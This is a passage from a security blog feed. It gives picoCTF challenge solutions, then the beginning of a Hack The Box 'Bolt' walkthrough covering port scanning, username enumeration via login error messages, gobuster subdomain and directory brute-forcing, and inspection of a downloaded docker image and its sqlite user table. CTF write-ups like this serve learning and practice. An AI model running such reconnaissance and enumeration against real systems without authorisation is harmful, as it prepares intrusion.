<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">password <span style="color:#ff79c6">=</span> [
    <span style="color:#bd93f9">106</span> , <span style="color:#bd93f9">85</span>  , <span style="color:#bd93f9">53</span>  , <span style="color:#bd93f9">116</span> , <span style="color:#bd93f9">95</span>  , <span style="color:#bd93f9">52</span>  , <span style="color:#bd93f9">95</span>  , <span style="color:#bd93f9">98</span>  ,
    <span style="color:#bd93f9">0x55</span>, <span style="color:#bd93f9">0x6e</span>, <span style="color:#bd93f9">0x43</span>, <span style="color:#bd93f9">0x68</span>, <span style="color:#bd93f9">0x5f</span>, <span style="color:#bd93f9">0x30</span>, <span style="color:#bd93f9">0x66</span>, <span style="color:#bd93f9">0x5f</span>,
    <span style="color:#bd93f9">0o142</span>, <span style="color:#bd93f9">0o131</span>, <span style="color:#bd93f9">0o164</span>, <span style="color:#bd93f9">0o63</span> , <span style="color:#bd93f9">0o163</span>, <span style="color:#bd93f9">0o137</span>, <span style="color:#bd93f9">0o146</span>, <span style="color:#bd93f9">0o064</span> ,
    <span style="color:#f1fa8c">&#39;a&#39;</span> , <span style="color:#f1fa8c">&#39;8&#39;</span> , <span style="color:#f1fa8c">&#39;c&#39;</span> , <span style="color:#f1fa8c">&#39;d&#39;</span> , <span style="color:#f1fa8c">&#39;8&#39;</span> , <span style="color:#f1fa8c">&#39;f&#39;</span> , <span style="color:#f1fa8c">&#39;7&#39;</span> , <span style="color:#f1fa8c">&#39;e&#39;</span>
    ]

flag <span style="color:#ff79c6">=</span> []
flag<span style="color:#ff79c6">.</span>extend([<span style="color:#8be9fd;font-style:italic">chr</span>(password[x]) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">8</span>)] )
flag<span style="color:#ff79c6">.</span>extend([<span style="color:#8be9fd;font-style:italic">chr</span>(password[x]) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">8</span>,<span style="color:#bd93f9">16</span>)])
flag<span style="color:#ff79c6">.</span>extend([<span style="color:#8be9fd;font-style:italic">chr</span>(password[x]) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">16</span>,<span style="color:#bd93f9">24</span>)])
flag<span style="color:#ff79c6">.</span>extend([    password[x]  <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">24</span>,<span style="color:#bd93f9">32</span>)])

<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;picoCTF{</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">}&#34;</span> <span style="color:#ff79c6">%</span> <span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join(flag))
</code></pre></td></tr></table>
</div>
</div><h2 id="like1000">like1000</h2>
<pre><code>curl -LOs https://jupiter.challenges.picoctf.org/static/52084b5ad360b25f9af83933114324e0/1000.tar
for i in `seq 1000 -1 1`; do tar -xvf $i.tar ; rm $i.tar ; done
open flag.png
</code></pre>
<p>Flag: picoCTF{l0t5_0f_TAR5}</p>
<h2 id="droids0">droids0</h2>
<p>Hints:</p>
<ol>
<li>Try using an emulator or device</li>
<li><a href="https://developer.android.com/studio">https://developer.android.com/studio</a></li>
</ol>
<p>pass</p>
<h2 id="mus1c">mus1c</h2>
<p>Rockstar is a programming language which gnerates code that can be sing as the lyric of a metal ballad.
Copying the song lyrics in this <a href="https://codewithrockstar.com/online">online interpreter</a> provides
an output that seems to be ascii. We will parse in python</p>
<pre tabindex="0"><code>ascii = &quot;&quot;&quot;
114
114
114
111
99
107
110
114
110
48
49
49
51
114
&quot;&quot;&quot;

flag = &quot;&quot;
for i in ascii.strip().split('\n'):
    flag += chr(int(i))

print(&quot;picoCTF{%s}&quot; % flag)
</code></pre>]]></content></item><item><title>Htb Bolt</title><link>https://0xade1.github.io/posts/2021/10/htb-bolt/</link><pubDate>Thu, 28 Oct 2021 21:26:15 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/10/htb-bolt/</guid><description>Reconnaissance Open 10.10.11.114:22 Open 10.10.11.114:80 Open 10.10.11.114:443 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack nginx 1.18.0 (Ubuntu) |_http-favicon: Unknown favicon MD5: 76362BB7970721417C5F484705E5045D | http-methods: |_ Supported Methods: HEAD GET OPTIONS |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Starter Website - About 443/tcp open ssl/http syn-ack nginx 1.18.0 (Ubuntu) |_http-favicon: Unknown favicon MD5: 82C6406C68D91356C9A729ED456EECF4 | http-methods: |_ Supported Methods: GET HEAD POST |_http-server-header: nginx/1.</description><content type="html"><![CDATA[<h2 id="reconnaissance">Reconnaissance</h2>
<pre><code>Open 10.10.11.114:22
Open 10.10.11.114:80
Open 10.10.11.114:443

PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     syn-ack nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 76362BB7970721417C5F484705E5045D
| http-methods:
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title:     Starter Website -  About
443/tcp open  ssl/http syn-ack nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 82C6406C68D91356C9A729ED456EECF4
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: Passbolt | Open source password manager for teams
|_Requested resource was /auth/login?redirect=%2F
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Issuer: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-24T19:11:23
| Not valid after:  2022-02-24T19:11:23
| MD5:   3ac3 4f7c ee22 88de 7967 fe85 8c42 afc6
| SHA-1: c606 ca92 404f 2f04 6231 68be c4c4 644f e9ed f132
| -----BEGIN CERTIFICATE-----
| MIIDozCCAougAwIBAgIUWYR6DcMDhx5i4CpQ5qkkspuUULAwDQYJKoZIhvcNAQEL
[..]
| +uYRUUWj+CdI1oxxYt0SdimXHr81SgE=
|_-----END CERTIFICATE-----
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p>The frontpage says:</p>
<pre><code>Administration using Admin LTE
</code></pre>
<p>emails found on the website:</p>
<ul>
<li><a href="mailto:support@bolt.htb">support@bolt.htb</a></li>
<li><a href="mailto:sales@bolt.htb">sales@bolt.htb</a></li>
</ul>
<p>possible users enumerated from website pages:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Christopher M. Wood</td>
<td>Sales</td>
</tr>
<tr>
<td>Bonnie M. Green</td>
<td>Marketing</td>
</tr>
<tr>
<td>Neil D. Sims</td>
<td>Invoice</td>
</tr>
</tbody>
</table>
<p>The website allows to test valid user emails because error messages tells you whether the password or the username is invalid:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="mailto:support@bolt.htb">support@bolt.htb</a></td>
<td>Invalid login. Forbidden.</td>
</tr>
<tr>
<td><a href="mailto:sales@bolt.htb">sales@bolt.htb</a></td>
<td>Invalid login. Forbidden.</td>
</tr>
<tr>
<td>support</td>
<td>Invalid login. Forbidden.</td>
</tr>
<tr>
<td>sales</td>
<td>Invalid login. Forbidden.</td>
</tr>
<tr>
<td><a href="mailto:admin@bolt.htb">admin@bolt.htb</a></td>
<td>Invalid login. Forbidden.</td>
</tr>
<tr>
<td>admin</td>
<td><code>Access Denied! Invalid password. Please try again.</code></td>
</tr>
<tr>
<td><a href="mailto:christopher@bolt.htb">christopher@bolt.htb</a></td>
<td>Invalid login. Forbidden.</td>
</tr>
<tr>
<td>christopher</td>
<td>Invalid login. Forbidden.</td>
</tr>
<tr>
<td>etc.</td>
<td>etc.</td>
</tr>
</tbody>
</table>
<p>will go for signup, but we got an <code>Internal Server Error</code>, so we have to look at existing accounts. The lost password section is deactivated.</p>
<p>On the check-email page we receive the below message.</p>
<pre><code>Email verification required
Please verify your email in order to authenticate.
</code></pre>
<p>It seems there is an email verification procedure somewhere, but obscure how it works. It is likely we have to explore what is <strong>Admin LTE</strong> to figure out how this sauce tastes.</p>
<p>We discover two more domains pointing to the same <strong>passbolt</strong> application:</p>
<pre><code>gobuster vhost -u http://bolt.htb -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50
Found: mail.bolt.htb (Status: 200) [Size: 4943]
Found: demo.bolt.htb (Status: 302) [Size: 219]
</code></pre>
<p>Passbolt is an open source collaborative password manager:</p>
<pre><code>curl -kL -v https://demo.bolt.htb
curl -kL -v https://demo.bolt.htb
curl -k -v https://mail.bolt.htb/auth/login

   / __ \____  _____ ____/ /_  ____  / / /_
  / /_/ / __ `/ ___/ ___/ __ \/ __ \/ / __/
 / ____/ /_/ (__  )__  ) /_/ / /_/ / / /_
/_/    \__,_/____/____/_.___/\____/_/\__/

Open source password manager for teams
Copyright (c) Passbolt SA (https://www.passbolt.com)


This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program. If not, see http://www.gnu.org/licenses/.


--&gt;
&lt;meta name=&quot;description&quot; content=&quot;Open source password manager for teams&quot;&gt;
&lt;meta name=&quot;keywords&quot; content=&quot;Passbolt, password manager, online password manager, open source password manager&quot;&gt;
&lt;meta name=&quot;robots&quot; content=&quot;noindex, nofollow&quot;&gt;
&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
&lt;link rel=&quot;shortcut icon&quot; type=&quot;image/x-icon&quot; href=&quot;https://passbolt.bolt.htb/favicon.ico&quot; /&gt;
</code></pre>
<h2 id="demobolthtb">demo.bolt.htb</h2>
<p>gobuster dir -k -u <a href="https://demo.bolt.htb">https://demo.bolt.htb</a> -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -b 403
/css (Status: 301)
/img (Status: 301)
/js (Status: 301)
/register (Status: 301)
/login (Status: 301)
/logout (Status: 301)
/app (Status: 302)
/users (Status: 302)
/fonts (Status: 301)
/groups (Status: 302)
/locales (Status: 301)
/recover (Status: 301)</p>
<p>/users/register
/users/recover
/auth/login</p>
<p>gobuster dir -k -u <a href="https://demo.bolt.htb/auth/">https://demo.bolt.htb/auth/</a> -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -b 302,403
/register (Status: 301)
/login (Status: 200)</p>
<p>gobuster dir -k -u <a href="https://demo.bolt.htb/users/">https://demo.bolt.htb/users/</a> -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -b 302,403
/login (Status: 301)
/register (Status: 404)
/recover (Status: 200)</p>
<p>gobuster dir -k -u <a href="https://passbolt.bolt.htb">https://passbolt.bolt.htb</a> -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50
gobuster dir -k -u <a href="https://passbolt.bolt.htb/auth/">https://passbolt.bolt.htb/auth/</a> -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50
gobuster dir -k -u <a href="https://passbolt.bolt.htb/users/">https://passbolt.bolt.htb/users/</a> -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50
gobuster dir -k -u <a href="https://passbolt.bolt.htb/app/">https://passbolt.bolt.htb/app/</a> -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50</p>
<h2 id="passboltbolthtb">passbolt.bolt.htb</h2>
<pre><code>Access to this service requires an invitation.
This email is not associated with any approved users on this domain. Please contact your administrator to request an invitation link.
</code></pre>
<p>Revisiting <a href="https://passbolt.bolt.htb/check-email">https://passbolt.bolt.htb/check-email</a> shows version 3.2.1</p>
<p>On <a href="https://github.com/passbolt/passbolt_api/releases">https://github.com/passbolt/passbolt_api/releases</a> for next release 3.3.0, it says:</p>
<pre><code>Security
    PB-8047 Fix PBL-02-002 As LU I should logout by posting to the API and the entry point should should be protected by CSRF
    PB-7751 Updates FlySystem dependency to v2.1.1
    SEC-181 Fix information disclosure: recover endpoint should not return user role and name.
</code></pre>
<p>We can check the commits but nothing really pops-out :</p>
<pre><code>commit 24aa8b802feac1bd5587dade674bd5621d0f0c48
Merge: 551832d42b 05e0305c4b
Author: Remy B &lt;remy@passbolt.com&gt;
Date: Mon Oct 25 08:09:32 2021 +0000

Merge branch 'feature/SEC-181-fix-information-disclosure-recover' into 'common'

SEC-181 Fix information disclosure: recover endpoint should not return user role and name.

See merge request passbolt/passbolt-pro-api!308

commit 05e0305c4b5f6986f4f96a04e7d8c742bc17e44d
Author: Cedric Alfonsi &lt;cedric@passbolt.com&gt;
Date: Mon Oct 25 10:04:21 2021 +0200

SEC-181 Fix information disclosure: recover endpoint should not return user role and name.

Signed-off-by: Cedric Alfonsi &lt;cedric@passbolt.com&gt;

commit 1770678e0efa0a812b9ce05cb7cfa809c78945a2
Merge: e53c8cfd8a 551832d42b
Author: Cedric Alfonsi &lt;cedric@passbolt.com&gt;
Date: Sun Oct 24 22:33:57 2021 +0200

Merge branch 'common' into develop
</code></pre>
<h2 id="docker-image">docker image</h2>
<p>On the download page of the website, we are invited to try the service by downloading a docker image. Exploring the image reveals the name of the vendor<code>appseed</code>, and the underlying technology <code>python flask</code>:</p>
<p>cat repositories | jq</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
  <span style="color:#ff79c6">&#34;flask-dashboard-adminlte_appseed-app&#34;</span>: {
    <span style="color:#ff79c6">&#34;latest&#34;</span>: <span style="color:#f1fa8c">&#34;3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162&#34;</span>
  }
}
</code></pre></td></tr></table>
</div>
</div><p>cat manifest.json | jq</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">[
  {
    <span style="color:#ff79c6">&#34;Config&#34;</span>: <span style="color:#f1fa8c">&#34;859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json&#34;</span>,
    <span style="color:#ff79c6">&#34;RepoTags&#34;</span>: [<span style="color:#f1fa8c">&#34;flask-dashboard-adminlte_appseed-app:latest&#34;</span>],
    <span style="color:#ff79c6">&#34;Layers&#34;</span>: [
      <span style="color:#f1fa8c">&#34;187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar&#34;</span>,
      <span style="color:#f1fa8c">&#34;745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar&#34;</span>,
      <span style="color:#f1fa8c">&#34;41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar&#34;</span>,
      <span style="color:#f1fa8c">&#34;d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/layer.tar&#34;</span>,
      <span style="color:#f1fa8c">&#34;3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/layer.tar&#34;</span>,
      <span style="color:#f1fa8c">&#34;9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar&#34;</span>,
      <span style="color:#f1fa8c">&#34;1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/layer.tar&#34;</span>,
      <span style="color:#f1fa8c">&#34;a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar&#34;</span>,
      <span style="color:#f1fa8c">&#34;3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar&#34;</span>,
      <span style="color:#f1fa8c">&#34;2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/layer.tar&#34;</span>,
      <span style="color:#f1fa8c">&#34;3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/layer.tar&#34;</span>
    ]
  }
]
</code></pre></td></tr></table>
</div>
</div><p>To Explore the content of the application, we have to Import the archived docker image. It is as simples as <a href="https://computingforgeeks.com/how-to-export-and-import-docker-images-containers/">this</a>:</p>
<pre><code>docker load &lt; /tmp/image.tar
3fc64803ca2d: Loading layer [==================================================&gt;]  4.463MB/4.463MB
73f2f98bc222: Loading layer [==================================================&gt;]   7.68kB/7.68kB
8f2df5d06a26: Loading layer [==================================================&gt;]  62.86MB/62.86MB
a1e4f9dc4110: Loading layer [==================================================&gt;]  57.57MB/57.57MB
f0c4120bc314: Loading layer [==================================================&gt;]  29.79MB/29.79MB
14ec2ed1c30d: Loading layer [==================================================&gt;]  6.984MB/6.984MB
68c03965721f: Loading layer [==================================================&gt;]  3.072kB/3.072kB
fec67b58fd48: Loading layer [==================================================&gt;]  19.97kB/19.97kB
7fa1531c7420: Loading layer [==================================================&gt;]  7.168kB/7.168kB
e45bbea785e3: Loading layer [==================================================&gt;]  15.36kB/15.36kB
ac16908b339d: Loading layer [==================================================&gt;]  8.192kB/8.192kB
Loaded image: flask-dashboard-adminlte_appseed-app:latest
</code></pre>
<p>Slight modification of the run.py is needed so that I can use my host browser:</p>
<ul>
<li>have the flask application run on <strong>0.0.0.0</strong></li>
<li>map the ports docker:5000 to the host:5000</li>
<li>mount the volume to play with its content</li>
</ul>
<p>The flask application is an administration platform. We can register, then login with test:test.</p>
<pre tabindex="0"><code>docker run --rm -it -p 5000:5000 flask-dashboard-adminlte_appseed-app sh
</code></pre><pre><code>/ # vi run.py
/ # cat run.py | grep app.run
app.run('0.0.0.0')
/ # python3 run.py
[2021-10-31 04:33:12,846] INFO in run: DEBUG = True
[2021-10-31 04:33:12,846] INFO in run: Environment = Debug
[2021-10-31 04:33:12,846] INFO in run: DBMS = sqlite:////db.sqlite3
_ Tip: There are .env or .flaskenv files present. Do &quot;pip install python-dotenv&quot; to use them.
_ Serving Flask app &quot;app&quot; (lazy loading)
_ Environment: production
WARNING: This is a development server. Do not use it in a production deployment.
Use a production WSGI server instead.
_ Debug mode: on
_ Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)
_ Restarting with stat
[2021-10-31 04:33:13,521] INFO in run: DEBUG = True
[2021-10-31 04:33:13,522] INFO in run: Environment = Debug
[2021-10-31 04:33:13,522] INFO in run: DBMS = sqlite:////db.sqlite3
_ Tip: There are .env or .flaskenv files present. Do &quot;pip install python-dotenv&quot; to use them.
_ Debugger is active! \* Debugger PIN: 959-707-878
172.17.0.1 - - [31/Oct/2021 04:33:25] &quot;GET /login HTTP/1.1&quot; 200 -
172.17.0.1 - - [31/Oct/2021 04:33:30] &quot;GET /register HTTP/1.1&quot; 200 -
172.17.0.1 - - [31/Oct/2021 04:33:51] &quot;POST /register HTTP/1.1&quot; 200 -
172.17.0.1 - - [31/Oct/2021 04:33:55] &quot;GET /login HTTP/1.1&quot; 200 -
172.17.0.1 - - [31/Oct/2021 04:34:02] &quot;POST /login HTTP/1.1&quot; 302 -
172.17.0.1 - - [31/Oct/2021 04:34:02] &quot;GET / HTTP/1.1&quot; 302 -
172.17.0.1 - - [31/Oct/2021 04:34:02] &quot;GET /login HTTP/1.1&quot; 302 -
172.17.0.1 - - [31/Oct/2021 04:34:02] &quot;GET /index HTTP/1.1&quot; 200 -
</code></pre>
<p>it opens <a href="https://github.com/app-generator/flask-dashboard-adminlte">AdminLTE</a> which is an open source product. According to <strong>Adminlte.js</strong>, the current version is: <code>AdminLTE v3.1.0-pre</code>.</p>
<p>Exploring the sqlite database, leads to Nothing as it contains only users I have registered.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">sqlite3
SQLite <span style="color:#ff79c6">version</span> <span style="color:#bd93f9">3</span>.<span style="color:#bd93f9">28</span>.<span style="color:#bd93f9">0</span> <span style="color:#bd93f9">2019</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">16</span> <span style="color:#bd93f9">19</span>:<span style="color:#bd93f9">49</span>:<span style="color:#bd93f9">53</span>
Enter <span style="color:#f1fa8c">&#34;.help&#34;</span> <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">usage</span> hints.
Connected <span style="color:#ff79c6">to</span> a transient <span style="color:#ff79c6">in</span><span style="color:#ff79c6">-</span>memory <span style="color:#ff79c6">database</span>.
Use <span style="color:#f1fa8c">&#34;.open FILENAME&#34;</span> <span style="color:#ff79c6">to</span> reopen <span style="color:#ff79c6">on</span> a persistent <span style="color:#ff79c6">database</span>.
sqlite<span style="color:#ff79c6">&gt;</span> attach <span style="color:#f1fa8c">&#34;db.sqlite3&#34;</span> <span style="color:#ff79c6">as</span> db
   ...<span style="color:#ff79c6">&gt;</span> ;
sqlite<span style="color:#ff79c6">&gt;</span> .databases
main:
db: <span style="color:#ff79c6">/</span>private<span style="color:#ff79c6">/</span>tmp<span style="color:#ff79c6">/</span>db.sqlite3
sqlite<span style="color:#ff79c6">&gt;</span> .tables
db.<span style="color:#ff79c6">User</span>
sqlite<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">select</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">from</span> db.<span style="color:#ff79c6">User</span>;
<span style="color:#bd93f9">1</span><span style="color:#ff79c6">|</span>test<span style="color:#ff79c6">|</span>test<span style="color:#ff79c6">@</span>bolt.htb<span style="color:#ff79c6">|</span>$<span style="color:#bd93f9">1</span>$XztGk033$PKNqG2O072NwJfcwXDdXN<span style="color:#ff79c6">/||</span>
